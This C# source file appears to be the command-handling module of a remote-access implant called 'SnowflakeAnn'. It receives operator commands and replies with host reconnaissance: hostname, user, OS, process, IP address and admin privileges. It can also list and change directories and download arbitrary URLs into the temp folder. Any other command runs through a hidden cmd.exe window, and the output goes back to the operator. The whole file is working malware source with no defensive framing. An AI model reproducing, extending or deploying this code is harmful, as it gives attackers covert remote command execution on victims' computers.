using System;
using System.Linq;

namespace SnowflakeAnn
{
    class Operations
    {
        GeneralInfo generalInfo = new GeneralInfo();

        public Operations(GeneralInfo instance)
        {
            generalInfo = instance;
        }

        public string CommandParser(string cmd)
        {
            string command = "";
            string arg = "";
            if(cmd.Contains(" "))
            {
                command = cmd.Split(" ")[0];
                arg = cmd.Split(" ")[1];
            }
            else 
            {
                command = cmd;
            }

            //TODO: Replace this with a switch statement
            if (command.Contains("download"))
            {
                return DownloadFile(arg);
            }
            else if (command.Contains("cd"))
            {
                return SetWorkingDirectory(arg);
            }
            else if (command.Contains("ls") || command.Contains("dir")) 
            {
                 return EnumWorkingDirectory(arg);
            }
            else if (command.Contains("hostname")) 
            {
                return GetHostName();
            }            
            else if (command.Contains("osinfo")) 
            {
                return GetOsInfo();
            }            
            else if (command.Contains("username")) 
            {
                return GetUserName();
            }            
            else if (command.Contains("processinfo")) 
            {
                return GetProcessInfo();
            }            
            else if (command.Contains("pwd")) 
            {
                return GetWorkingDirectory();
            }            
            else if (command.Contains("ipaddress")) 
            {
                return GetIpv4Address();
            }            
            else if (command.Contains("privileges")) 
            {
                return GetPrivileges();
            }
            else if (command.Contains("exepath")) 
            {
                return GetExePath();
            }
            else {
                return ExecuteCmd(cmd);
            }
        }

        public string DownloadFile(string url)
        {
            try {
                System.Net.WebClient wInstance = new System.Net.WebClient();
                string fileName = url.Split("/")[url.Split('/').Length - 1];
                string tempPath = System.IO.Path.GetTempPath();
                // Console.Write($"[debug] Path: {tempPath}");
                string savePath = tempPath + fileName;
                wInstance.DownloadFile(url, savePath);
                return $"File has been downloaded to {savePath}";
            } catch(Exception e) {
                return e.Message.ToString();
            }
        }

        public string SetWorkingDirectory(string path)
        {
            try {
                System.IO.Directory.SetCurrentDirectory(path);
                return "Working directory changed";
            } catch(Exception e) {
                return e.Message.ToString();
            }
        }

        public string EnumWorkingDirectory(string path)
        {
            try {
                if (path == "")
                {
                    path = generalInfo.cDirectory;
                }
                System.Text.StringBuilder sbInstance = new System.Text.StringBuilder();
                var dirs = from line in System.IO.Directory.EnumerateDirectories(path) select line;

                foreach(var dir in dirs)
                {
                    sbInstance.Append(dir);
                    sbInstance.Append(Environment.NewLine);
                }

                var files = from line in System.IO.Directory.EnumerateFiles(path) select line;

                foreach(var file in files)
                {
                    sbInstance.Append(file);
                    sbInstance.Append(Environment.NewLine);
                }

                string dirsAndFiles = sbInstance.ToString();
                return dirsAndFiles;
            } catch(Exception e) {
                return e.Message.ToString();
            }
        }

        public string ExecuteCmd(string command)
        {
            try {
                string result = "";
                System.Diagnostics.Process pInstance = new System.Diagnostics.Process();
                pInstance.StartInfo.FileName = "cmd.exe";
                pInstance.StartInfo.Arguments = "/c" + command;
                pInstance.StartInfo.UseShellExecute = false;
                pInstance.StartInfo.CreateNoWindow = true;
                pInstance.StartInfo.WorkingDirectory = generalInfo.cDirectory;
                pInstance.StartInfo.RedirectStandardOutput = true;
                pInstance.StartInfo.RedirectStandardError = true;
                pInstance.Start();
                result += pInstance.StandardOutput.ReadToEnd();
                result += pInstance.StandardError.ReadToEnd();
                return result;
            } catch(Exception e) {
                return e.Message.ToString();
            }
        }
        public string GetHostName() { return generalInfo.hostName; }
        public string GetUserName() { return generalInfo.uName; }
        public string GetIpv4Address() { return generalInfo.ipv4Address; }
        public string GetProcessInfo() { return $"{generalInfo.pName} {generalInfo.pId}" ; }
        public string GetPrivileges() { return generalInfo.isAdmin.ToString(); }
        public string GetWorkingDirectory() { return generalInfo.cDirectory; }
        public string GetExePath() { return generalInfo.ePath; }
        public string GetOsInfo() { return generalInfo.oSystem; }
    }
}
